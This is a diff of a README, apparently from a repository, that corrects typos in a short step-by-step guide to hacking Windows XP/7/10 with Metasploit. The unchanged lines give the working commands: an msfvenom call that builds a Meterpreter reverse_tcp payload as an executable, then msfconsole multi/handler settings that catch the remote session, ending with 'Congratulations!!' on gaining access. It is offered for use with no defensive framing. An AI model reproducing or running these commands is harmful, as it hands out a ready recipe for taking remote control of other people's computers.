@@ -1,7 +1,7 @@
 # system_hacking-windows-XP-7-10-
 Step-by-step commands for hacking into windows XP/7/10 using **Metasploit Framework**
 
-### Command to create a exploit:
+### Command to create an exploit:
 `msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.160 -f exe -o /home/yash/Desktop/Exploit.exe`
 
 Then open MSF: `msfconsole`
@@ -10,7 +10,7 @@ Then open MSF: `msfconsole`
 
 `msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp`
 
-*select the same payload of which we have created the exploit*
+*Select the same payload of which we have created the exploit*
 
 `msf6 exploit(multi/handler) > set LHOST 192.168.1.12`
 
@@ -24,4 +24,4 @@ Then open MSF: `msfconsole`
 
 *Now you will get the session*
 
-*Congragulations!!*
+*Congratulations!!*
